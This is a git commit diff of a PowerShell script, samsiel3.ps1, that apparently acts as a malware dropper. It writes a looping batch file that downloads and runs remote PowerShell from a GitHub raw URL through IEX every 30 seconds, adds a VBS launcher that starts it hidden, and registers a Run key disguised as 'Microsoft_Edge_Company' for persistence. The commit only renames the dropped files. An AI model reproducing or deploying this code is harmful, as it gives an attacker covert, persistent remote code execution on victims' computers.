b248226f8d78934831e39fae26bc78446f212f4f
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:30:01 -0500

    Update samsiel3.ps1

--- samsiel3.ps1
+++ samsiel3.ps1
@@ -3,8 +3,8 @@ md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
 powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
 timeout /t 30
 goto a
-"@; add-content "C:\Intel\Profiles/IE/IEX/seruex.bat" $contenttoadd; $contentToAdd = @"
+"@; add-content "C:\Intel\Profiles/IE/IEX/perse.bat" $contenttoadd; $contentToAdd = @"
 set objshell = createobject("wscript.shell")
 objshell.run "seruex.bat",vbhide
-"@; add-content "C:\Intel\Profiles/IE/IEX/seruex.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/seruex.vbs; cd C:\Intel\Profiles/IE/IEX; ./seruex.vbs
+"@; add-content "C:\Intel\Profiles/IE/IEX/perse.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/perse.vbs; cd C:\Intel\Profiles/IE/IEX; ./perse.vbs
 exit
